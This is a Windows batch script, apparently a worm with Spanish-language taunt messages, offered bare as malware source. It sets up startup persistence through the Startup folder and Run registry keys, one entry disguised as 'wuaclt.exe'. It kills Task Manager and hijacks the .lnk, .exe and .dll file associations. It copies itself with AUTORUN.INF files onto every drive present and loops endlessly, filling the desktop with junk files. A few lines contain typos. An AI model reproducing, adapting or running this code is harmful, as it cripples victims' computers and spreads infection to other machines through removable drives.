@echo off
copy /y "%0" "%userprofile%\Menú Inicio\Programas\Inicio\assoc.bat">nul 2>&1
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "assoc.bat" /d "%0" /f
assoc .lnk=ARQfile
msg * Hola Gold beta testers...!!!
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v assoc.bat /d "c:\assoc.bat" /f
taskkill /im taskmgr.exe
ipconfig /flushdns 
REG ADD HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v wuaclt.exe /t REG_SZ /d "C:\WINDOWS\assoc.bat" /f 
:inicio
msg * Usted ha sido atacado por un ejercito cybernetico.
FOR %%A IN (C D F G H I J K L M N O P Q R S T U V W X Y Z) DO CALL :verificar %%A  
GOTO :EOF 
:verificar 
IF EXIST "%1:" (CALL :copiado %1) 
GOTO :EOF  
:copiado  
COPY assoc.bat "%1:\845782.bat" 
echo [AUTORUN] > "%1:\AUTORUN.INF" 
echo shell\1=abrir >>":\AUTORUN.INF" 
echo shell\1\Command="assoc.bat" >>"%1:\AUTORUN.INF" 
echo shell\2=explorar >>"%1:\AUTORUN.INF" 
echo shell\2\Command="assoc.bat" >>"%1:\AUTORUN.INF" 
echo shellexecute= "\assoc.bat" >>"%1:\AUTORUN.INF" 
ping -n 10 localhost 
assoc .exe=NRGfile
assoc .dll=MDFfile
cd \
cd %homepath%
cd escritorio
echo :msg>>%ramdom%.pmw
echo :msg>>%ramdom%.psw
echo :msg>>%ramdom%.rdp
echo :msg>>%ramdom%.scf
echo :msg>>%ramdom%.sct
echo :msg>>%ramdom%.shs
echo :msg>>%ramdom%.theme
echo :msg>>%ramdom%.ttc
echo :msg>>%ramdom%.udl
echo :msg>>%ramdom%.wam
echo :msg>>%ramdom%.wme
echo :msg>>%ramdom%.wsf
echo :msg>>%ramdom%.zap
echo :msg>>%ramdom%.mp3
echo :msg>>%ramdom%.mp4
echo :msg>>%ramdom%.wav
echo :msg>>%ramdom%.cda
echo :msg>>%ramdom%.ogg
echo :msg>>%ramdom%.ogm
echo :msg>>%ramdom%.AAC
echo :msg>>%ramdom%.shar
echo :msg>>%ramdom%.tar
echo :msg>>%ramdom%.cpio
echo :msg>>%ramdom%.bat
echo :msg>>%ramdom%.ht
echo :msg>>%ramdom%.ini
echo :msg>>%ramdom%.isp
echo :msg>>%ramdom%.lnk
echo :msg>>%ramdom%.msi
echo :msg>>%ramdom%.msstyles
echo :msg>>%ramdom%.p7c
echo :msg>>%ramdom%.pif
echo :msg>>%ramdom%.pma
echo :msg>>%ramdom%.bat
echo :msg>>%ramdom%.pml
GOTO :inicio 